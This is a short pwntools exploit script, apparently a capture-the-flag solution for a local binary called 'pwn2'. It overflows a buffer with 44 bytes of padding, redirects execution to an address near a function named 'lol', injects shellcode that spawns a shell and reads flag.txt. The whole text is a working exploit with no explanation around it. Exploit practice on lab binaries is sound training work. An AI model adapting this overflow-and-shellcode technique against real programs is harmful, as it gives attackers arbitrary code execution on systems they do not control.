from pwn import *

context.binary = "./pwn2"

p = process()

p.send(b"A" * 44)
p.p32(context.binary.functions["lol"].address + 3)
p.sendline(asm(shellcraft.sh()))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
